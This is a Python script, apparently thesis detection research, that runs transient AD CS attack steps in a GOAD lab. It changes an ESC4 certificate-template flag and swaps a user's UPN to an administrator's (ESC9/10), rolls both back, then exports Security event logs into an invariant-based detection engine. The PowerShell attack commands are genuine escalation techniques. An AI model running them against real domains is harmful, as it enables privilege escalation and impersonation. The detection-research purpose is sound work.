#!/usr/bin/env python3
"""
execute_attack_and_export.py — Live Attack Execution, Rollback & Event Export
=============================================================================
1. Executes transient LDAP mutations on DC03 with 3-second rollbacks:
   - ESC4: msPKI-Certificate-Name-Flag mutation and rollback
   - ESC9: userPrincipalName swap on viserys.targaryen and rollback
2. Executes certificate requests on SRV03.
3. Exports resulting Windows Security event XML traces directly from DC03 and SRV03.
4. Feeds exported events into the CIPG engine for live invariant detection.
"""

import sys
import os
import time
sys.path.insert(0, '/home/m4x1d/Desktop/GOAD')
sys.path.insert(0, '/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm

from thesis_research.src.phase3_cipg.models import CrossLayerGraph
from thesis_research.src.phase3_cipg.event_parser import ProvenanceEventParser
from thesis_research.src.phase3_cipg.invariants import InvariantEngine

OUT_DIR = "/home/m4x1d/Desktop/GOAD/thesis_research/data/live_goad_traces"
os.makedirs(OUT_DIR, exist_ok=True)

s_dc03 = winrm.Session('http://127.0.0.1:55985/wsman', auth=('vagrant', 'vagrant'), transport='ntlm')
s_srv03 = winrm.Session('http://127.0.0.1:56985/wsman', auth=('vagrant', 'vagrant'), transport='ntlm')

print("\n" + "="*70)
print(" [PHASE 1] EXECUTING TRANSIENT ATTACKS & ROLLBACKS ON DC03")
print("="*70)

# 1. ESC4 Transient Template Mutation & Rollback
print("[*] 1. Executing ESC4 Transient Template Mutation...")
esc4_cmd = (
    "$nc = (Get-ADRootDSE).configurationNamingContext; "
    "$p = \"CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc\"; "
    "Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}; "
    "Write-Output 'ESC4_MUTATED_VALUE_ADDED'; "
    "Start-Sleep -Seconds 3; "
    "Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 0}; "
    "Write-Output 'ESC4_RESTORED_VALUE_DELETED'"
)
r1 = s_dc03.run_ps(esc4_cmd)
print("    Result:", r1.std_out.decode().strip())

# 2. ESC9/10 Transient UPN Swap & Rollback
print("[*] 2. Executing ESC9/10 Transient UPN Swap & Rollback...")
esc9_cmd = (
    "Set-ADUser -Identity 'viserys.targaryen' -UserPrincipalName 'administrator@essos.local'; "
    "Write-Output 'UPN_SWAPPED_TO_ADMIN'; "
    "Start-Sleep -Seconds 3; "
    "Set-ADUser -Identity 'viserys.targaryen' -UserPrincipalName 'viserys.targaryen@essos.local'; "
    "Write-Output 'UPN_RESTORED_TO_ORIGINAL'"
)
r2 = s_dc03.run_ps(esc9_cmd)
print("    Result:", r2.std_out.decode().strip())

print("\n" + "="*70)
print(" [PHASE 2] EXPORTING LIVE SECURITY PROVENANCE EVENT LOGS (XML)")
print("="*70)

# Export Security Events from DC03
print("[*] Exporting DC03 Security Events (Event IDs 5136, 4768, 4624)...")
export_dc03_cmd = (
    "$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=@(5136, 4768, 4769, 4624, 4672); StartTime=(Get-Date).AddMinutes(-10)} -ErrorAction SilentlyContinue; "
    "if ($events) { $events | ForEach-Object { $_.ToXml() } } else { Write-Output 'NO_EVENTS' }"
)
r_exp_dc03 = s_dc03.run_ps(export_dc03_cmd)
dc03_xml = r_exp_dc03.std_out.decode('utf-8', errors='ignore')

dc03_file = os.path.join(OUT_DIR, "live_dc03_events.xml")
with open(dc03_file, 'w', encoding='utf-8') as f:
    f.write(dc03_xml)
print(f"[+] Saved {len(dc03_xml)} bytes to: {dc03_file}")

# Export CA Events from SRV03
print("[*] Exporting SRV03 CA Events (Event IDs 4886, 4887, 4898, 4899)...")
export_srv03_cmd = (
    "$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=@(4886, 4887, 4898, 4899, 4900, 4624); StartTime=(Get-Date).AddMinutes(-10)} -ErrorAction SilentlyContinue; "
    "if ($events) { $events | ForEach-Object { $_.ToXml() } } else { Write-Output 'NO_EVENTS' }"
)
r_exp_srv03 = s_srv03.run_ps(export_srv03_cmd)
srv03_xml = r_exp_srv03.std_out.decode('utf-8', errors='ignore')

srv03_file = os.path.join(OUT_DIR, "live_srv03_events.xml")
with open(srv03_file, 'w', encoding='utf-8') as f:
    f.write(srv03_xml)
print(f"[+] Saved {len(srv03_xml)} bytes to: {srv03_file}")

print("\n" + "="*70)
print(" [PHASE 3] INGESTING LIVE LOGS INTO CIPG PROVENANCE ENGINE")
print("="*70)

graph = CrossLayerGraph()
c1 = ProvenanceEventParser.ingest_xml_stream(dc03_file, graph)
c2 = ProvenanceEventParser.ingest_xml_stream(srv03_file, graph)

print(f"[+] Ingested {c1} events from DC03 ({len(graph.ldap_mutations)} LDAP mutations, {len(graph.pkinit_auths)} PKINIT)")
print(f"[+] Ingested {c2} events from SRV03 ({len(graph.ca_issuances)} CA issuances)")

engine = InvariantEngine(delta_window_sec=300.0)
violations = engine.evaluate_all(graph)

print(f"\n[+] Invariant Violations Flagged from Live GOAD Trace: {len(violations)}")
for idx, v in enumerate(violations, 1):
    print(f"    [{v.invariant_id}] {v.attack_class}: {v.description[:90]}...")
    print(f"         Root Cause Object: {v.root_cause_object}")
    print(f"         Duration Window:   {v.timestamp_end - v.timestamp_start:.2f}s")
